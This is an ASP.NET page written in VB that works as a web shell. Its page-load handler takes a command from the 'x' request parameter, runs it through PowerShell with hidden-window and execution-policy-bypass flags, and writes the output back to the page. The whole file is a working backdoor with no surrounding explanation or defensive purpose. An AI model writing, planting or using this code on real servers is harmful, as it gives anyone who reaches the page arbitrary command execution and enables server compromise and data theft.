<%@ Page Language="VB" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
Sub Page_Load(Sender As Object, E As EventArgs)
    Dim cmd As String = Request("x")
    If Not String.IsNullOrEmpty(cmd) Then
        Dim psi As New ProcessStartInfo()
        psi.FileName = "powershell.exe"
        psi.Arguments = "-NoP -NonI -W Hidden -Exec Bypass -Command """ & cmd & """"
        psi.UseShellExecute = False
        psi.RedirectStandardOutput = True
        psi.RedirectStandardError = True
        psi.CreateNoWindow = True

        Dim proc As Process = Process.Start(psi)
        Dim output As String = proc.StandardOutput.ReadToEnd() & proc.StandardError.ReadToEnd()

        Response.Write("<pre>" & Server.HtmlEncode(output) & "</pre>")
    End If
End Sub
</script>
